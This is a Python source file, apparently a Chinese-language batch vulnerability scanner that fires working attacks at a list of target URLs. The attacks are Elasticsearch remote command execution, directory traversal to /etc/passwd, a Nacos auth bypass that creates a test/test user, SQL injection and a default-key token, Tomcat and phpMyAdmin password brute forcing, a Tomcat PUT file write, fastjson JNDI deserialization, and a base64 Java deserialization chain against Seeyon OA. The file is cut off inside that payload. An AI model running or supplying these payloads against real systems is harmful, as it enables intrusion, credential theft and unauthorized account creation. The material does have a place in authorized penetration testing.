#!/usr/bin/python
'''
未覆盖文件上传类POC
1. ES数据库漏洞POC
2. nacos漏洞POC
3. tomcat漏洞POC
4. fastjson漏洞POC
5. 致远OA漏洞POC
6. 用友OA漏洞POC
7. redis未授权
8. mongodb未授权
9. memcached 未授权
10. zookeeper未授权
11. ftp匿名未授权
12. CouchDB未授权
13.  docker未授权
14. Hadoop未授权
'''

import requests
import basic
import sys
from datetime import datetime
from base64 import b64encode
from config import tomcat_user_dir
from config import tomcat_pass_dir
from config import nacos_user_dir
from config import nacos_pass_dir
from config import phpmyadmin_user_dir
from config import phpmyadmin_pass_dir
import json
import os
from config import jndi_server
import random
from fake_useragent import UserAgent
from basic import generate_random_ip
import re
from config import custom_poc_timeout
import socket
import pymongo
from concurrent.futures import ThreadPoolExecutor
from config import threadnum
import ftplib
import logging
import subprocess

# elasticsearch数据库相关漏洞扫描
def es_unauthorized():

    hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
    }

    exec_header = {
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    pass_header = {
        'User-Agent': 'Mozilla/5.0 (compatible; Elasticsearch; +http://www.elastic.co/)',
        'Accept': '*/*',
        'Connection': 'close'
    }

    # 设置请求正文
    exec_data = {
        'size': 1,
        'query': {
            'filtered': {
                'query': {
                    'match_all': {}
                }
            }
        },
        'script_fields': {
            'command': {
                'script': "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
            }
        }
    }

    # 资产文件存入列表
    url_list = basic.url_file_ip_list()

    # 提取es资产存入列表
    try:
        es_url_list = []
        for i in url_list:
            if ':9200' in i:
                es_url_list.append(i)
    except Exception as e:
        print("捕获到异常:", e)
    
    # 循环es资产列表判断是否存在未授权访问漏洞
    for url in es_url_list:
        # 获取当前时间
        now = datetime.now()

        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")
        # 未授权访问漏洞
        try:
            # 忽略ssl证书验证
            res = requests.get(url,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            res.encoding='utf-8'
            restext = res.text
            if 'cluster_name' and 'cluster_uuid' and 'version' in restext:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在未授权访问漏洞")
        except:
            pass

        # elasticsearch远程命令执行漏洞
        cmd_exec_dir = "/_search?pretty"
        # 将数据转换为 JSON 格式
        json_data = requests.compat.json.dumps(exec_data)
        # 发送 POST 请求
        try:
            es_data_response = requests.post(url+cmd_exec_dir, headers=exec_header, data=json_data, allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            es_data_response.encoding='utf-8'
            es_data_response_text = es_data_response.text
            es_data_response_json = json.loads(es_data_response_text)
            exec_result = es_data_response_json['hits']['hits'][0]['fields']['command'][0]
            if 'command' and 'uid' and 'gid' and 'groups' in es_data_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+cmd_exec_dir+" "+"存在远程命令执行漏洞"+" "+"("+exec_result+")")
        except:
            pass

        # elasticsearch目录穿越漏洞
        es_pass_dir = '/_plugin/head/../../../../../../../../../etc/passwd'
        try:
            # 忽略ssl证书验证
            res_pass = requests.get(url+es_pass_dir,headers=pass_header,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            res_pass.encoding='utf-8'
            res_pass_text = res_pass.text
            if '/bin/bash' and '/usr/sbin/nologin' and 'bin' in res_pass_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+es_pass_dir+" "+"存在目录穿越漏洞")
        except:
            pass





# nacos漏洞扫描
def nacos_vuln_scan():
    hearders = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i'
    }

    # 资产文件存入列表
    url_list = basic.url_file_ip_list()
    # 遍历列表判断是否存在nacos默认配置未授权访问漏洞
    for url in url_list:
        # 获取当前时间
        now = datetime.now()
        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")

        # 验证nacos默认配置未授权访问漏洞
        poc_dir = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
        try:
            # 忽略ssl证书验证
            res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            res.encoding='utf-8'
            restext = res.text
            if 'totalCount' and 'username' and 'password' in restext:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+poc_dir+" "+"存在nacos默认配置未授权访问漏洞")
        except:
            pass

        # 验证nacos权限绕过漏洞，并新增用户（test/test）
        auth_poc_dir = "/nacos/v1/auth/users"
        # POST请求参数
        data = {
            'username':'test',
            'password':'test'
        }
        try:
            # 发送POST请求,忽略ssl验证
            response = requests.post(url+auth_poc_dir, data=data, headers=hearders,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            response.encoding='utf-8'
            response_text = response.text
            if '200' and 'create' and 'user' and 'ok' in response_text:
                 # 忽略ssl证书验证
                res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
                res.encoding='utf-8'
                restext = res.text
                if 'test' and 'username' in restext:
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+url+poc_dir+" "+"存在权限绕过漏洞并新增用户(test/test)")
        except:
            pass

        # Nacos Derby SQL注入漏洞验证
        nacos_sql_inject_dir = "/nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73"
        try:
            # 忽略ssl证书验证
            res_sql = requests.get(url+nacos_sql_inject_dir,headers=hearders,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            res_sql.encoding='utf-8'
            res_sql_text = res_sql.text
            if '200' and 'USERNAME' and 'PASSWORD' and 'true' in res_sql_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_sql_inject_dir+" "+"存在 Nacos Derby SQL注入漏洞")
        except:
            pass

        # nacos默认密钥导致的未授权访问漏洞
        nacos_secret_dir = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9"
        try:
            # 忽略ssl证书验证
            res_secret = requests.get(url+nacos_secret_dir,headers=hearders,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            res_secret.encoding='utf-8'
            res_secret_text = res_secret.text
            if 'totalCount' and 'username' and 'password' and 'pageItems' in res_secret_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_secret_dir+" "+"存在 Nacos secret.key默认密钥 未授权访问漏洞")
        except:
            pass

        # nacos常见弱口令扫描
        weakpassword_dir = "/nacos/v1/auth/users/login"

        # 通过字典文件生成
        user_list = []
        file_user = open(nacos_user_dir,encoding='utf-8')
        for userline in file_user.readlines():
            user_list.append(userline.strip())
    
        pass_list = []
        file_pass = open(nacos_pass_dir,encoding='utf-8')
        for passline in file_pass.readlines():
            pass_list.append(passline.strip())
        # 使用列表推导式生成包含多个字典的列表
        nacos_dict_list = [{'username': username, 'password': password} for username in user_list for password in pass_list]
        
        try:
            for auth in nacos_dict_list:
                # 发送POST请求,忽略ssl验证
                response_weak = requests.post(url+weakpassword_dir, data=auth, headers=hearders,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
                response_weak.encoding='utf-8'
                response_weak_text = response_weak.text
    
                if '200' and 'Authorization' and 'accessToken' and 'username' in response_weak_text:
                    
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+url+weakpassword_dir+" "+"存在nacos弱口令漏洞:"+"("+auth['username']+"/"+auth['password']+")")
        except:
            pass



# 禅道漏洞批量扫描
def chandao_vuln_scan():
    url_list = basic.url_file_ip_list()
    for url in url_list:
        hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
        }

        # 获取当前时间
        now = datetime.now()
        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")

        # 验证禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞
        chandao_file_read_dir = "/api-getModel-file-parseCSV-fileName=/etc/passwd"
        try:
            # 忽略ssl证书验证
            res_readfile = requests.get(url+chandao_file_read_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            res_readfile.encoding='utf-8'
            res_readfile_text = res_readfile.text
            if 'success' and 'data' and 'md5' in res_readfile_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+chandao_file_read_dir+" "+"存在禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞")
        except:
            pass
        
        # 禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞
        chandao_api_sql_dir = "/api-getModel-api-sql-sql=select+account,password+from+zt_user"
        
        try:
            # 忽略ssl证书验证
            res_api_sql = requests.get(url+chandao_api_sql_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            res_api_sql.encoding='utf-8'
            res_api_sql_text = res_api_sql.text
            if 'password' and '\"account\"\:\"zentao\"' in res_api_sql_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+chandao_api_sql_dir+" "+"存在禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞")
        except:
            pass



# tomcat 相关漏洞扫描
def tomcat_vuln_scan():
    # 通过字典文件生成
    user_list = []
    file_user = open(tomcat_user_dir,encoding='utf-8')
    for userline in file_user.readlines():
        user_list.append(userline.strip())

    pass_list = []
    file_pass = open(tomcat_pass_dir,encoding='utf-8')
    for passline in file_pass.readlines():
        pass_list.append(passline.strip())
    # 使用列表推导式生成包含多个字典的列表
    tomcat_dict_list = [{'username': username, 'password': password} for username in user_list for password in pass_list]
    
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    url_list = basic.url_file_ip_list()
    # tomcat后台口令暴力破解
    # 修改路径为/manager/html
    manager_dir_list = []
    for url in url_list:
        manager_dir_list.append(url+"/manager/html")
    
    for manager_url in manager_dir_list:

        # 基本认证信息，用户名和密码
        for auth in tomcat_dict_list:
            username = auth['username']
            password = auth['password']

            auth_str = f'{username}:{password}'
            encoded_auth_str = b64encode(auth_str.encode()).decode()
            
            # HTTP头部信息
            headers = {
                'Cache-Control': 'max-age=0',
                'Authorization': f'Basic {encoded_auth_str}',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Connection': 'close'
            }
            
            # 捕获异常处理
            try:
                # 发送GET请求
                response_weakpassword_tomcat = requests.get(manager_url, headers=headers,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
                response_weakpassword_tomcat.encoding='utf-8'
                response_weakpassword_tomcat_text = response_weakpassword_tomcat.text
                if 'Tomcat Web应用程序管理者' and '启动' and '停止' and '重新加载' in response_weakpassword_tomcat_text:
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+manager_url+" "+"存在tomcat管理后台弱口令:"+"("+username+"/"+password+")")
            except:
                pass
    
    # tomcat样例目录扫描
    example_dir_list = []
    for example_url in url_list:
        example_dir_list.append(example_url+"/examples/")
    headers_exam = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Connection': 'close'
            }
    for exam_urll in example_dir_list:
        # 捕获异常处理
        try:
            # 发送GET请求
            example_response = requests.get(exam_urll, headers=headers_exam,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            example_response.encoding='utf-8'
            example_response_text = example_response.text
            if 'Servlets examples' and 'JSP Examples' and 'WebSocket Examples' in example_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+exam_urll+" "+"存在tomcat样例目录泄露漏洞")
        except:
            pass
        


    # Tomcat PUT方法任意写文件漏洞
    code_exec_dir = '/test.txt'
    test_data = 'hello world'
    # 遍历列表批量尝试上传文件
    for exec_code_url in url_list:
        try:
            # 尝试上传测试文件
            requests.put(exec_code_url+code_exec_dir+'/',data=test_data)
            # 验证是否上传成功
            code_res = requests.get(exec_code_url+code_exec_dir)
            code_res.encoding='utf-8'
            code_res_text = code_res.text
            if 'hello world' in code_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+exec_code_url+code_exec_dir+" "+"存在Tomcat PUT方法任意写文件漏洞")
        except:
            pass

# fastjson相关漏洞扫描
def fastjson_vuln_scan():
    url_list = basic.url_file_ip_list()
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    fastjson_header = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Content-Type': 'application/json',
        'Content-Length': '160'
    }
    # 构造POST请求的body-1.2.24版本
    fastjson_data = {  
        "b": {  
            "@type": "com.sun.rowset.JdbcRowSetImpl",  
            "dataSourceName": jndi_server,  
            "autoCommit": True  
        }  
    }
    # 构造POST请求的body-1.2.47版本
    fastjson_data_v2 = {
        
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":jndi_server,
            "autoCommit":True
    }
}
    # 将data字典转换为JSON字符串  
    data_json = json.dumps(fastjson_data) 
    data_json_v2 = json.dumps(fastjson_data_v2)
    for url in url_list:
        # fastjson 1.2.24反序列化漏洞
        try:
            # 发送POST请求  
            fastjson_response = requests.post(url, headers=fastjson_header, data=data_json,allow_redirects=False,verify=False,timeout=custom_poc_timeout)
            fastjson_response.encoding='utf-8'
            fastjson_response_text = fastjson_response.text
            if 'timestamp' and '500' and 'Internal Server Error' and 'set property error, autoCommit' in fastjson_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson1.2.24反序列漏洞,请检查JNDI服务日志确认是否成功执行")
        except:
            pass

        # fastjson 1.2.47反序列化漏洞
        try:
            # 发送POST请求  
            fastjson_response_v2 = requests.post(url, headers=fastjson_header, data=data_json_v2,allow_redirects=False,verify=False,timeout=custom_poc_timeout)
            fastjson_response_v2.encoding='utf-8'
            fastjson_response_v2_text = fastjson_response_v2.text
            if 'timestamp' and '400' and 'Bad Request' and 'set property error, autoCommit' and 'com.alibaba.fastjson.JSONException' in fastjson_response_v2_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson1.2.47反序列漏洞,请检查JNDI服务日志确认是否成功执行")
        except:
            pass


# 蓝凌OA漏洞扫描，正在完善中还未接入系统
def lanlingoa_vuln_scan():
    url_list = basic.url_file_ip_list()
   
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    # 任意文件读取路径
    file_read_dir = "/sys/ui/extend/varkind/custom.jsp"
    lanlingoa_header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length': '42',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip'
    }

    data = 'var={"body":{"file":"file:///etc/passwd"}}'
    
    for url in url_list:
        try:
            # 发送POST请求
            lanling_response = requests.post(url+file_read_dir, headers=lanlingoa_header, data=data,allow_redirects=False,verify=False,timeout=custom_poc_timeout)
            lanling_response.encoding='utf-8'
            lanling_response_text = lanling_response.text
            
            if 'root' and '/bin/bash' in lanling_response_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+file_read_dir+" "+"存在蓝凌OA任意文件读取漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+file_read_dir+" "+"不存在蓝凌OA任意文件读取漏洞")
        except:
            pass
    

# waf识别检测扫描
def waf_tool_scan():
    url_list = basic.url_file_ip_list()
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    # 存在WAF设备列表
    waf_list = []
    for url in url_list:
    
        try:
            result = os.popen('bash /TIP/info_scan/finger.sh waf_scan_shell'+' '+url).read()
            # 不存在WAF
            if 'No WAF detected by the generic detection' in result:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在WAF防护设备")
            # 存在WAF
            else:
                waf_list.append(url)
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"疑似存在WAF防护设备")
        except:
            pass

    # 根据有WAF列表过滤待扫描文件
    for url1 in waf_list:
        try:
            os.popen('bash /TIP/info_scan/finger.sh waf_filter'+' '+url1)
        except:
            pass


# phpmyadmin相关漏洞扫描,完善中，未接入系统
def phpmyadmin_vuln_scan():
    UA = UserAgent()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': UA.random,
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'X-Forwarded-For': generate_random_ip()
    }
    
    url_list = basic.url_file_ip_list()
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    phpmyadmin_dir = "/index.php"

    # 通过字典文件生成
    user_list = []
    file_user = open(phpmyadmin_user_dir,encoding='utf-8')
    for userline in file_user.readlines():
        user_list.append(userline.strip())

    pass_list = []
    file_pass = open(phpmyadmin_pass_dir,encoding='utf-8')
    for passline in file_pass.readlines():
        pass_list.append(passline.strip())
    # 使用列表推导式生成包含多个字典的列表
    phpmyadmin_dict_list = [{'pma_username': username, 'pma_password': password} for username in user_list for password in pass_list]
    
    for url in url_list:
        for auth in phpmyadmin_dict_list:
            try:
                # 发送POST请求
                phpmyadmin_response = requests.post(url+phpmyadmin_dir, headers=headers, data=auth,allow_redirects=False,verify=False,timeout=custom_poc_timeout)
                print(auth)
                phpmyadmin_response.encoding='utf-8'
                phpmyadmin_response_text = phpmyadmin_response.text

                if 'Location' and 'phpMyAdmin=' and 'pmaUser-1' in phpmyadmin_response_text:
                    print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在弱口令漏洞")
            except:
                pass
    


# 致远OA漏洞POC扫描
def seeyon_vuln_scan():
    url_list = basic.url_file_ip_list()
    hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
        }
    hearder1 = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length':'804',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'cmd': '@@@@@echo Test'


    }
    for url in url_list:
        print("url:"+url)
        # 获取当前时间
        now = datetime.now()
        # 格式化时间，只保留时、分、秒
        formatted_time = now.strftime("%H:%M:%S")

        # ①、致远OA A6 createMysql.jsp 数据库敏感信息泄露
        seeyonoa_sql_dir1 = "/yyoa/createMysql.jsp"
        seeyonoa_sql_dir2 = "/yyoa/ext/createMysql.jsp"
        try:
            # 忽略ssl证书验证
            seeyonoa_sql_dir1_res = requests.get(url+seeyonoa_sql_dir1,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyonoa_sql_dir1_res.encoding='utf-8'
            seeyonoa_sql_dir1_res_text = seeyonoa_sql_dir1_res.text

            seeyonoa_sql_dir2_res = requests.get(url+seeyonoa_sql_dir2,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyonoa_sql_dir2_res.encoding='utf-8'
            seeyonoa_sql_dir2_res_text = seeyonoa_sql_dir2_res.text
            if seeyonoa_sql_dir1_res.status_code == 200 and 'root' in seeyonoa_sql_dir1_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyonoa_sql_dir1+" "+"存在致远OA A6 createMysql.jsp 数据库敏感信息泄露")
            elif seeyonoa_sql_dir2_res.status_code == 200 and 'root' in seeyonoa_sql_dir2_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyonoa_sql_dir2+" "+"存在致远OA A6 createMysql.jsp 数据库敏感信息泄露")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA A6 createMysql.jsp 数据库敏感信息泄露")
        except:
            pass
        
        # ②、致远OA A6 config.jsp 敏感信息泄漏漏洞
        seeyonoa_config_dir = "/yyoa/ext/trafaxserver/SystemManage/config.jsp"
        try:
            # 忽略ssl证书验证
            seeyonoa_config_dir_res = requests.get(url+seeyonoa_config_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyonoa_config_dir_res.encoding='utf-8'
            seeyonoa_config_dir_res_text = seeyonoa_config_dir_res.text
            
            if seeyonoa_config_dir_res.status_code == 200 and 'jdbc:microsoft:sqlserver://' in seeyonoa_config_dir_res_text and 'DatabaseName' in seeyonoa_config_dir_res_text and 'ftp://' in seeyonoa_config_dir_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyonoa_sql_dir1+" "+"存在致远OA A6 config.jsp 敏感信息泄漏漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA A6 config.jsp 敏感信息泄漏漏洞")
        except:
            pass

        # ③、致远OA A6 DownExcelBeanServlet 用户敏感信息泄露
        seeyonoa_downexcelBeanServlet_dir = "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
        try:
            # 忽略ssl证书验证
            seeyonoa_downexcelBeanServlet_dir_res = requests.get(url+seeyonoa_downexcelBeanServlet_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyonoa_downexcelBeanServlet_dir_res.encoding='utf-8'
            seeyonoa_downexcelBeanServlet_dir_res_header = seeyonoa_downexcelBeanServlet_dir_res.headers
            header_result = seeyonoa_downexcelBeanServlet_dir_res_header.get('Content-disposition','')
            if  'xls' in str(header_result).lower():
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyonoa_downexcelBeanServlet_dir+" "+"存在致远OA A6 DownExcelBeanServlet 用户敏感信息泄露")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA A6 DownExcelBeanServlet 用户敏感信息泄露")
        except:
            pass
        # ④、致远OA A6 initDataAssess.jsp 用户敏感信息泄露
        seeyon_initdataassess_dir = "/yyoa/assess/js/initDataAssess.jsp"
        try:
            # 忽略ssl证书验证
            seeyon_initdataassess_dir_res = requests.get(url+seeyon_initdataassess_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyon_initdataassess_dir_res.encoding='utf-8'
            seeyon_initdataassess_dir_res_text = seeyon_initdataassess_dir_res.text
            if seeyon_initdataassess_dir_res.status_code == 200 and   'personList' in seeyon_initdataassess_dir_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyon_initdataassess_dir+" "+"存在致远OA A6 initDataAssess.jsp 用户敏感信息泄露")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA A6 initDataAssess.jsp 用户敏感信息泄露")
        except:
            pass
        # ⑤、致远OA M1Server userTokenService 远程命令执行漏洞
        try:
            seeyon_usertokenservice_dir = "/esn_mobile_pns/service/userTokenService"
            data = '{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKS5nZXRSZXNvdXJjZUFzU3RyZWFtKCJDbGFzcy5jbGFzcyIpLnJlYWRBbGxCeXRlcygpLG51bGwpOwogIHZhciByZWZsZWN0aW9uRGF0YUZpZWxkID0gY2xhenpBbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpOwogIHVuc2FmZS5wdXRPYmplY3QoY2xhenosdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KHJlZmxlY3Rpb25EYXRhRmllbGQpLG51bGwpOwp9CmZ1bmN0aW9uIGJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSB7CiAgdmFyIHJlZmxlY3Rpb25DbGFzczsKICB0cnkgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0LlJlZ